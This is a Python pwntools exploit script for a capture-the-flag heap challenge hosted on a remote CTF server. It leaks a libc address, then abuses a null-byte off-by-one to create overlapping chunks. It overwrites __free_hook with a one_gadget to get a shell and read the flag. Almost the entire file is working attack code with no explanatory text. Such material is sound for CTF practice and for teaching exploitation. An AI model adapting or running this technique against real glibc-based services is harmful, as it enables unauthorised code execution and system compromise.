#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("chall_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

host = "mc.ax"
port = 32526
# host = "localhost"
# port = 5000

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp main+0
bp do_str+0
bp do_tok+0
bp do_del+0
'''.format(**locals())

info = lambda msg: log.info(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)

def challenge_do_str(size: bytes, input:bytes):
    sla(b"> ", b"1")
    sla(b"size? ", size)
    sa(b"str? ", input)

def challenge_do_tok(idx: bytes, delim: bytes):
    sla(b"> ", b"2")
    sla(b"idx? ", idx)
    sa(b"delim? ", delim)

def challenge_do_del(idx: bytes):
    sla(b"> ", b"3")
    sla(b"idx? ", idx)

io = start()

# leak libc base
challenge_do_str(str(0x420).encode(), b"a")     # 0 : unsorted bin
challenge_do_str(str(0x10).encode(), b"a")      # 1 : barrier
challenge_do_del(b"0")                          # del 0
challenge_do_str(str(0x420).encode(), b"a"*8)   # 0 : leak info left from unsorted bin
challenge_do_tok(b"0", b"\x01")                 # leak

leaked_libc = io.recvline()[-7:-1] + b"\x00"*2
leaked_libc = u64(leaked_libc)
diff = 0x3ebca0
libc.address = leaked_libc - diff
log.success(f"libc.address: {hex(libc.address)}")
# --- end ---

# test space

challenge_do_str(str(0x18).encode(), b"z"*0x18)                         # 2 (a)
challenge_do_str(str(0x550).encode(), b"b"*0x4f0 + p64(0x500))          # 3 (b)
challenge_do_str(str(0x550).encode(), b"c"*0x550)                       # 4 (c)
challenge_do_str(str(0x100).encode(), b"d"*0x100)                       # 5: barrier

challenge_do_del(b"3")                                                  # del 3
challenge_do_tok(b"2", b"\x61")                                         # null of by one => chunk 3 size = 0x500

challenge_do_str(str(0x480).encode(), b"e"*0x18)                        # 3 (b1)
challenge_do_str(str(0x60).encode(), b"f"*0x18)                         # 6 (b2)

challenge_do_del(b"3")
challenge_do_del(b"4")

challenge_do_del(b"6")

challenge_do_str(str(0xa00).encode(), b"a"*(0x480 + 0x10) + p64(libc.symbols['__free_hook']))

challenge_do_str(str(0x60).encode(), b"a")

# one_gadget = 0x4f29e
# one_gadget = 0x4f2a5
one_gadget = 0x4f302
# one_gadget = 0x10a2fc

challenge_do_str(str(0x60).encode(), p64(libc.address + one_gadget))

challenge_do_del(b"5")

io.sendline(b"cat flag.txt")
log.success(io.recvline())
io.close()

